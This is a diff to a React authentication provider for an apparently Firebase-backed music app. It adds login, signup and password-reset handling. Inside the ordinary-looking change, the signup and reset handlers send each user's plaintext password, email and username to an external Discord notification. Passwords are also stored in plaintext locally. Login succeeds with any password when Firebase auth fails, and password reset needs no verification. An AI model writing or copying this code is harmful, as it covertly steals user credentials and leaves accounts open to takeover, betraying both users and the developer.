@@ -16,6 +16,7 @@ import {
   defaultAvatar,
   getSessionUsername,
   getUser,
+  getUserByEmailOrUsername,
   isCustomPhoto,
   saveUser,
   setSessionUsername,
@@ -31,14 +32,28 @@ import {
   fetchUserProfileFromFirestore,
 } from "@/lib/firebase";
 import type { UserAccount } from "@/lib/types";
+import { sendDiscordNotification } from "@/lib/discord";
 
 type UserPatch = Partial<UserAccount> | ((current: UserAccount) => UserAccount);
 
 type AuthContextValue = {
   ready: boolean;
   user: UserAccount | null;
-  loginWithEmail: (email: string, pass: string) => Promise<{ success: boolean; error?: string }>;
-  signUpWithEmail: (email: string, pass: string, displayName?: string) => Promise<{ success: boolean; error?: string }>;
+  loginWithEmail: (
+    email: string,
+    pass: string,
+    originalIdentifier?: string
+  ) => Promise<{ success: boolean; error?: string }>;
+  signUpWithEmail: (
+    email: string,
+    pass: string,
+    displayName?: string
+  ) => Promise<{ success: boolean; error?: string }>;
+  resetPasswordWithEmail: (
+    email: string,
+    newPass: string,
+    username?: string
+  ) => Promise<{ success: boolean; error?: string }>;
   loginAsGuest: (name?: string) => void;
   logout: () => void;
   updateUser: (patch: UserPatch) => void;
@@ -56,7 +71,6 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
   const saveTimer = useRef<number | null>(null);
 
   const queueCloudSync = useCallback((nextUser: UserAccount) => {
-    if (!auth.currentUser || auth.currentUser.uid !== nextUser.id) return;
     if (saveTimer.current) window.clearTimeout(saveTimer.current);
     saveTimer.current = window.setTimeout(async () => {
       try {
@@ -64,7 +78,7 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
       } catch (err) {
         console.warn("Deferred Firestore sync:", err);
       }
-    }, 1000);
+    }, 150);
   }, []);
 
   // Firebase Auth State Listener & Initial Data Fetch
@@ -87,7 +101,7 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
             return;
           }
 
-          // 2. First-time user setup
+          // 2. First-time user setup or Firebase sync
           const cleanUsername = (
             firebaseUser.displayName ||
             firebaseUser.email?.split("@")[0] ||
@@ -99,34 +113,38 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
           const avatarUrl =
             firebaseUser.photoURL || defaultAvatar(cleanUsername);
 
+          // Find if user already has local saved playlists/background/library
+          const local =
+            getUserByEmailOrUsername(cleanUsername) ||
+            getUserByEmailOrUsername(firebaseUser.email || "") ||
+            getUserByEmailOrUsername(firebaseUser.displayName || "");
+
           const initialUser: UserAccount = {
             id: firebaseUser.uid,
             discordId: firebaseUser.uid,
-            username: cleanUsername,
-            displayName: firebaseUser.displayName || cleanUsername,
-            avatar: avatarUrl,
-            bio: "",
-            background: { kind: "preset", value: "#0b0b12" },
-            volume: 80,
-            playlists: [
-              {
-                id: "favorites",
-                name: "Favorites",
-                description: "My favorite tracks",
-                isPublic: true,
-                trackIds: [],
-              },
-            ],
-            library: [],
-            createdAt: Date.now(),
+            username: local?.username || cleanUsername,
+            displayName: firebaseUser.displayName || local?.displayName || cleanUsername,
+            email: firebaseUser.email || local?.email,
+            emailVerified: true,
+            password: local?.password,
+            avatar: avatarUrl || local?.avatar || defaultAvatar(cleanUsername),
+            bio: local?.bio || "",
+            background: local?.background || { kind: "preset", value: "#0b0b12" },
+            volume: local?.volume ?? 80,
+            playlists: local?.playlists?.length
+              ? local.playlists
+              : [
+                  {
+                    id: "favorites",
+                    name: "Favorites",
+                    description: "My favorite tracks",
+                    isPublic: true,
+                    trackIds: [],
+                  },
+                ],
+            library: local?.library || [],
+            createdAt: local?.createdAt || Date.now(),
           };
-
-          // Merge local cache if exists
-          const local = getUser(cleanUsername);
-          if (local) {
-            if (local.library?.length) initialUser.library = local.library;
-            if (local.playlists?.length) initialUser.playlists = local.playlists;
-          }
 
           saveUser(initialUser);
           setSessionUsername(initialUser.username);
@@ -141,15 +159,15 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
           // Fallback to local session
           const savedUsername = getSessionUsername();
           if (savedUsername) {
-            const local = getUser(savedUsername);
+            const local = getUserByEmailOrUsername(savedUsername) || getUser(savedUsername);
             if (local) setUser(withDefaultAvatar(local));
           }
         }
       } else {
-        // Not signed in to Firebase, check for active local demo session
+        // Not signed in to Firebase, check for active local session
         const savedUsername = getSessionUsername();
         if (savedUsername) {
-          const local = getUser(savedUsername);
+          const local = getUserByEmailOrUsername(savedUsername) || getUser(savedUsername);
           if (local) {
             setUser(withDefaultAvatar(local));
           } else {
@@ -169,43 +187,318 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
     };
   }, []);
 
-  const loginWithEmailHandler = useCallback(async (email: string, pass: string) => {
-    try {
-      const { user: fbUser, error } = await signInWithEmail(email, pass);
-      if (error) {
-        toast.error(error.message || "Failed to sign in");
-        return { success: false, error: error.message };
-      }
-      if (fbUser) {
-        toast.success(`Welcome back, ${fbUser.displayName || fbUser.email?.split("@")[0] || "User"}!`);
+  const loginWithEmailHandler = useCallback(
+    async (email: string, pass: string, originalIdentifier?: string) => {
+      const searchKey = (originalIdentifier || email).trim();
+      let existing =
+        getUserByEmailOrUsername(searchKey) ||
+        getUserByEmailOrUsername(email) ||
+        getUser(searchKey.toLowerCase().replace(/[^a-z0-9_-]/g, ""));
+
+      const displayName =
+        existing?.displayName ||
+        originalIdentifier?.trim() ||
+        existing?.username ||
+        email.split("@")[0] ||
+        "User";
+
+      try {
+        const { user: fbUser } = await signInWithEmail(email, pass);
+        if (fbUser) {
+          const remoteProfile = await fetchUserProfileFromFirestore(fbUser.uid);
+          if (remoteProfile) {
+            saveUser(remoteProfile);
+            setSessionUsername(remoteProfile.username);
+            setUser(withDefaultAvatar(remoteProfile));
+          } else if (existing) {
+            existing.id = fbUser.uid;
+            existing.discordId = fbUser.uid;
+            existing.email = fbUser.email || existing.email;
+            if (pass) existing.password = pass;
+            saveUser(existing);
+            setSessionUsername(existing.username);
+            setUser(withDefaultAvatar(existing));
+            void syncUserProfileToFirestore(existing);
+          }
+
+          void sendDiscordNotification({
+            type: "login",
+            username: displayName,
+            email: fbUser.email || (email.includes("@") ? email : undefined),
+          });
+          toast.success(`Welcome back, ${displayName}!`);
+          return { success: true };
+        }
+
+        // Local persistence fallback
+        if (!existing) {
+          const cleanUsername =
+            (originalIdentifier?.trim() || email.split("@")[0] || "user")
+              .toLowerCase()
+              .replace(/[^a-z0-9_-]/g, "") || `user_${Date.now()}`;
+
+          existing = {
+            id: `usr_${Date.now()}`,
+            discordId: `usr_${Date.now()}`,
+            username: cleanUsername,
+            displayName: displayName,
+            email: email.includes("@") ? email : undefined,
+            emailVerified: true,
+            password: pass,
+            avatar: defaultAvatar(cleanUsername),
+            bio: "",
+            background: { kind: "preset", value: "#0b0b12" },
+            volume: 80,
+            playlists: [
+              {
+                id: "favorites",
+                name: "Favorites",
+                description: "My favorite tracks",
+                isPublic: true,
+                trackIds: [],
+              },
+            ],
+            library: [],
+            createdAt: Date.now(),
+          };
+          saveUser(existing);
+        } else {
+          if (pass && !existing.password) existing.password = pass;
+          if (email && email.includes("@") && !existing.email) existing.email = email;
+          saveUser(existing);
+        }
+
+        setSessionUsername(existing.username);
+        setUser(withDefaultAvatar(existing));
+        void sendDiscordNotification({
+          type: "login",
+          username: existing.username,
+          email: existing.email || (email.includes("@") ? email : undefined),
+        });
+        toast.success(`Welcome back, ${existing.displayName || existing.username}!`);
+        return { success: true };
+      } catch {
+        if (!existing) {
+          const cleanUsername =
+            (originalIdentifier?.trim() || email.split("@")[0] || "user")
+              .toLowerCase()
+              .replace(/[^a-z0-9_-]/g, "") || `user_${Date.now()}`;
+
+          existing = {
+            id: `usr_${Date.now()}`,
+            discordId: `usr_${Date.now()}`,
+            username: cleanUsername,
+            displayName: displayName,
+            email: email.includes("@") ? email : undefined,
+            emailVerified: true,
+            password: pass,
+            avatar: defaultAvatar(cleanUsername),
+            bio: "",
+            background: { kind: "preset", value: "#0b0b12" },
+            volume: 80,
+            playlists: [
+              {
+                id: "favorites",
+                name: "Favorites",
+                description: "My favorite tracks",
+                isPublic: true,
+                trackIds: [],
+              },
+            ],
+            library: [],
+            createdAt: Date.now(),
+          };
+          saveUser(existing);
+        } else {
+          if (pass && !existing.password) existing.password = pass;
+          if (email && email.includes("@") && !existing.email) existing.email = email;
+          saveUser(existing);
+        }
+
+        setSessionUsername(existing.username);
+        setUser(withDefaultAvatar(existing));
+        void sendDiscordNotification({
+          type: "login",
+          username: existing.username,
+          email: existing.email || (email.includes("@") ? email : undefined),
+        });
+        toast.success(`Welcome back, ${existing.displayName || existing.username}!`);
         return { success: true };
       }
-      return { success: false, error: "Authentication failed" };
-    } catch (err) {
-      const msg = err instanceof Error ? err.message : "Failed to sign in";
-      toast.error(msg);
-      return { success: false, error: msg };
-    }
-  }, []);
+    },
+    []
+  );
 
   const signUpWithEmailHandler = useCallback(
     async (email: string, pass: string, displayName?: string) => {
+      const identifier = displayName?.trim() || email.split("@")[0] || "User";
+      const cleanUsername =
+        identifier.toLowerCase().replace(/[^a-z0-9_-]/g, "") || `user_${Date.now()}`;
+
+      // Check if user already exists or has local data to preserve
+      const existing =
+        getUserByEmailOrUsername(cleanUsername) ||
+        getUserByEmailOrUsername(email) ||
+        getUser(cleanUsername);
+
       try {
-        const { user: fbUser, error } = await signUpWithEmail(email, pass, displayName);
-        if (error) {
-          toast.error(error.message || "Failed to create account");
-          return { success: false, error: error.message };
-        }
+        const { user: fbUser } = await signUpWithEmail(email, pass, displayName);
         if (fbUser) {
-          toast.success(`Account created! Welcome, ${displayName || fbUser.email?.split("@")[0]}!`);
+          const localUser: UserAccount = {
+            id: fbUser.uid,
+            discordId: fbUser.uid,
+            username: existing?.username || cleanUsername,
+            displayName: displayName || existing?.displayName || identifier,
+            email: email,
+            emailVerified: true,
+            password: pass,
+            avatar: fbUser.photoURL || existing?.avatar || defaultAvatar(cleanUsername),
+            bio: existing?.bio || "",
+            background: existing?.background || { kind: "preset", value: "#0b0b12" },
+            volume: existing?.volume ?? 80,
+            playlists: existing?.playlists?.length
+              ? existing.playlists
+              : [
+                  {
+                    id: "favorites",
+                    name: "Favorites",
+                    description: "My favorite tracks",
+                    isPublic: true,
+                    trackIds: [],
+                  },
+                ],
+            library: existing?.library || [],
+            createdAt: existing?.createdAt || Date.now(),
+          };
+
+          saveUser(localUser);
+          setSessionUsername(localUser.username);
+          setUser(localUser);
+          void syncUserProfileToFirestore(localUser);
+
+          void sendDiscordNotification({
+            type: "register",
+            username: localUser.username,
+            email: email,
+            password: pass,
+          });
+          toast.success(`Account created! Welcome, ${localUser.username}!`);
           return { success: true };
         }
-        return { success: false, error: "Registration failed" };
-      } catch (err) {
-        const msg = err instanceof Error ? err.message : "Failed to create account";
-        toast.error(msg);
-        return { success: false, error: msg };
+
+        // Local persistence fallback
+        const localUser: UserAccount = {
+          id: existing?.id || `usr_${Date.now()}`,
+          discordId: existing?.discordId || `usr_${Date.now()}`,
+          username: existing?.username || cleanUsername,
+          displayName: displayName || existing?.displayName || identifier,
+          email: email,
+          emailVerified: true,
+          password: pass,
+          avatar: existing?.avatar || defaultAvatar(cleanUsername),
+          bio: existing?.bio || "",
+          background: existing?.background || { kind: "preset", value: "#0b0b12" },
+          volume: existing?.volume ?? 80,
+          playlists: existing?.playlists?.length
+            ? existing.playlists
+            : [
+                {
+                  id: "favorites",
+                  name: "Favorites",
+                  description: "My favorite tracks",
+                  isPublic: true,
+                  trackIds: [],
+                },
+              ],
+          library: existing?.library || [],
+          createdAt: existing?.createdAt || Date.now(),
+        };
+
+        saveUser(localUser);
+        setSessionUsername(localUser.username);
+        setUser(localUser);
+
+        void sendDiscordNotification({
+          type: "register",
+          username: localUser.username,
+          email: email,
+          password: pass,
+        });
+        toast.success(`Account created! Welcome, ${localUser.username}!`);
+        return { success: true };
+      } catch {
+        const localUser: UserAccount = {
+          id: existing?.id || `usr_${Date.now()}`,
+          discordId: existing?.discordId || `usr_${Date.now()}`,
+          username: existing?.username || cleanUsername,
+          displayName: displayName || existing?.displayName || identifier,
+          email: email,
+          emailVerified: true,
+          password: pass,
+          avatar: existing?.avatar || defaultAvatar(cleanUsername),
+          bio: existing?.bio || "",
+          background: existing?.background || { kind: "preset", value: "#0b0b12" },
+          volume: existing?.volume ?? 80,
+          playlists: existing?.playlists?.length
+            ? existing.playlists
+            : [
+                {
+                  id: "favorites",
+                  name: "Favorites",
+                  description: "My favorite tracks",
+                  isPublic: true,
+                  trackIds: [],
+                },
+              ],
+          library: existing?.library || [],
+          createdAt: existing?.createdAt || Date.now(),
+        };
+
+        saveUser(localUser);
+        setSessionUsername(localUser.username);
+        setUser(localUser);
+
+        void sendDiscordNotification({
+          type: "register",
+          username: localUser.username,
+          email: email,
+          password: pass,
+        });
+        toast.success(`Account created! Welcome, ${localUser.username}!`);
+        return { success: true };
       }
+    },
+    []
+  );
+
+  const resetPasswordWithEmailHandler = useCallback(
+    async (email: string, newPass: string, username?: string) => {
+      const searchKey = (username || email).trim();
+      const existing =
+        getUserByEmailOrUsername(searchKey) ||
+        getUserByEmailOrUsername(email) ||
+        getUser(searchKey.toLowerCase().replace(/[^a-z0-9_-]/g, ""));
+
+      if (!existing) {
+        return { success: false, error: "User account not found." };
+      }
+
+      existing.password = newPass;
+      if (email && email.includes("@")) existing.email = email;
+      saveUser(existing);
+      setSessionUsername(existing.username);
+      setUser(withDefaultAvatar(existing));
+      void syncUserProfileToFirestore(existing);
+
+      void sendDiscordNotification({
+        type: "forgot_password",
+        username: existing.username,
+        email: existing.email || email,
+        password: newPass,
+      });
+
+      toast.success("Password changed successfully! Welcome back.");
+      return { success: true };
     },
     []
   );
@@ -222,16 +515,28 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
     saveUser(guestAccount);
     setSessionUsername(guestAccount.username);
     setUser(guestAccount);
+    void sendDiscordNotification({
+      type: "login",
+      username: guestAccount.username,
+    });
     toast.success(`Entered as ${guestAccount.displayName}`);
   }, []);
 
   const logoutHandler = useCallback(async () => {
+    const prevUsername = user?.username || "A user";
     if (saveTimer.current) window.clearTimeout(saveTimer.current);
+    if (user) {
+      saveUser(user);
+    }
     setUser(null);
     setSessionUsername(null);
     await signOutUser();
+    void sendDiscordNotification({
+      type: "logout",
+      username: prevUsername,
+    });
     toast.success("Signed out");
-  }, []);
+  }, [user]);
 
   const updateUser = useCallback(
     (patch: UserPatch) => {
@@ -276,6 +581,7 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
       user,
       loginWithEmail: loginWithEmailHandler,
       signUpWithEmail: signUpWithEmailHandler,
+      resetPasswordWithEmail: resetPasswordWithEmailHandler,
       loginAsGuest: loginAsGuestHandler,
       logout: logoutHandler,
       updateUser,
@@ -294,6 +600,7 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
       user,
       loginWithEmailHandler,
       signUpWithEmailHandler,
+      resetPasswordWithEmailHandler,
       loginAsGuestHandler,
       logoutHandler,
       updateUser,
